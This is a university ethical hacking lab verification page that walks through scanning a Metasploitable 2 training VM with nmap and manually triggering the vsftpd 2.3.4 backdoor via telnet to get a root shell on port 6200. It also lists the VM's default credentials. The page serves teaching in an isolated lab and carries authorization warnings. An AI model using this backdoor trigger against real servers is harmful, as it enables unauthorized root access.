---
layout: default
title: Kali to Metasploitable 2 Verification
parent: Lab Verifications
nav_order: 1
permalink: /docs/lab-verifications/kali-metasploitable
---

# Metasploitable 2 Vulnerability Assessment and Exploitation 
## Detroit Mercy Ethical Hacking Course Assignment 9 Lab Verification for Apple Silicon Virtualizatized OSs

{% include vm-status.html 
   title="Lab Verification: Metasploitable 2 Vulnerability Assessment"
   status="FINALIZED"
   architecture="UTM on Apple Silicon"
   updated="May 2025"
   time="30 minutes"
   difficulty="Intermediate"
   compatibility="UTM 4.0+" %}

This verification lab confirms that our setup guides for Kali Linux and Metasploitable 2 on Apple Silicon Macs result in a fully functional penetration testing environment. We will follow the standard student workflow for completing this assignment to determine assignment compatibility with Apple Silicon Virtualized Machines.

{: .warning }
> **Warning:** The techniques demonstrated in this lab should only be used on systems you have permission to test. Metasploitable 2 is an intentionally vulnerable system designed for security training.

## Prerequisites

- Kali Linux VM installed according to our [Kali Linux guide]({{ site.baseurl }}/docs/kali-linux.html)
- Metasploitable 2 VM installed according to our [Metasploitable 2 guide]({{ site.baseurl }}/docs/metasploitable.html)
- Both VMs configured to use the same network mode in UTM ("Host Only" recommended)

## Lab Workflow Overview

This lab follows the assignment structure for vulnerability assessment and exploitation:

1. VSFTPD Vulnerability Assessment: Using Nmap to identify and verify the vulnerability
2. Manual Exploitation: Exploiting the backdoor manually with telnet
3. Metasploit Exploitation: Using the Metasploit Framework to automate the exploitation

## Task 1: VSFTPD Vulnerability Assessment

{% include step-progress.html
steps="VSFTPD Vulnerability Assessment,Manual Exploitation,Conclusion"
current=1 %}

To start this assignment, we must start both our Kali Linux and Metasploitable 2 machines. Prior to starting, please `make sure` your `Network Settings` for `BOTH` Virtual Machines are set to `Host-Only`.

In `Metasploitable 2` log in with the credentials

Username: `msfadmin`
Password: `msfadmin`

Then run the following command:
```bash
ifconfig
```
Take note of the `inet addr` listed in the ouput, as this is the IP address of your Metasploitable 2 Virtual Machine.

<div class="image-container">
     <a href="/UDMCyberSecurity-Labs-MacBookCompatibility/assets/images/lab-verification/LV-MS1.png" target="_blank">
       <img src="/UDMCyberSecurity-Labs-MacBookCompatibility/assets/images/lab-verification/LV-MS1.png" alt="Metasploitable 2 IP Address" class="clickable-image">
     </a>
</div>

In `Kali Linux`, you may now perform an initial scan of the target using `NMAP`:
```bash
sudo nmap -sV [Metasploitable IP]
```

The results should show vsftpd 2.3.4 running on port 21:

<div class="image-container">
     <a href="/UDMCyberSecurity-Labs-MacBookCompatibility/assets/images/lab-verification/LV-MS2.png" target="_blank">
       <img src="/UDMCyberSecurity-Labs-MacBookCompatibility/assets/images/lab-verification/LV-MS2.png" alt="Initial Nmap Service Scan" class="clickable-image">
     </a>
</div>

Next, lets use a specific `NMAP` script to test for a VSFTPD backdoor:
```bash
sudo nmap --script ftp-vsftpd-backdoor -p 21 [Metasploitable IP]
```

The results should show us that the target is `vulnerable` to this backdoor

<div class="image-container">
     <a href="/UDMCyberSecurity-Labs-MacBookCompatibility/assets/images/lab-verification/LV-MS3.png" target="_blank">
       <img src="/UDMCyberSecurity-Labs-MacBookCompatibility/assets/images/lab-verification/LV-MS3.png" alt="Nmap Scanning for VSFTPD Backdoor" class="clickable-image">
     </a>
</div>

## Task 2: Manual Exploitation of VSFTPD 2.3.4

{% include step-progress.html 
   steps="VSFTPD Vulnerability Assessment,Manual Exploitation,Conclusion" 
   current=2 %}
   
We will now move on to exploiting the VSFTPD 2.3.4 backdoor manually:

On Kali, connect to the `FTP Server` using `Telnet`:
```bash
telnet [Metasploitable IP] 21
```

At the `FTP` Login Prompt, enter the following:
```
USER user:)
PASS pass
```

Note: The `:)` is what generally triggers the backdoor

The FTP connection should close with a message `Connection closed by foreign host.` which indicates that the backdoor has successfully activated!

<div class="image-container">
     <a href="/UDMCyberSecurity-Labs-MacBookCompatibility/assets/images/lab-verification/LV-MS4.png" target="_blank">
       <img src="/UDMCyberSecurity-Labs-MacBookCompatibility/assets/images/lab-verification/LV-MS4.png" alt="Triggering VSFTPD Backdoor" class="clickable-image">
     </a>
</div>

Run a quick scan to verify that port 6200 is now open:
```bash
sudo nmap -p 6200 [Metasploitable 2 IP]
```

Connect to the backdoor shell on port 6200:
```bash
telnet [Metasploitable 2 IP] 6200
```

If successful, you should now have a command shell with root privileges. Verify with:
```bash
id;
whoami;
```
The output should show that you have `Root Privileges`

<div class="image-container">
     <a href="/UDMCyberSecurity-Labs-MacBookCompatibility/assets/images/lab-verification/LV-MS5.png" target="_blank">
       <img src="/UDMCyberSecurity-Labs-MacBookCompatibility/assets/images/lab-verification/LV-MS5.png" alt="Shell Access via VSFTPD Backdoor" class="clickable-image">
     </a>
</div>

## Conclusion

{% include step-progress.html
steps="VSFTPD Vulnerability Assessment,Manual Exploitation,Conclusion"
current=3 %}

This documentation confirms that labs involving Kali Linux and Metasploitable 2 communication can be completed on Apple Silicon devices.

{: .warning }
> **Remember**: The techniques demonstrated in this lab are meant for educational purposes only. Always obtain proper authorization before performing security testing on any system.

